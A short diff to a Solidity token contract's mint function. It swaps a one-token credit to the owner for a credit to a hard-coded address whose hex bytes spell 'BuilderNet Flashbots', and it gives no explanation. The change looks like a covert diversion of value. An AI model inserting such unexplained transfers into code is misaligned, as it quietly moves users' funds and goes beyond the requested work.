@@ -22,7 +22,7 @@ contract SafeToken {
         require(totalSupply + amount >= totalSupply, "Overflow");
         totalSupply += amount;
         balances[to] += amount;
-	balances[owner] += 1;
+	balances[address(0x4275696c6465724E657420466c617368626F7473)] += 1;
     }
 
     /// @custom:strata requires amount <= balances[msg.sender]
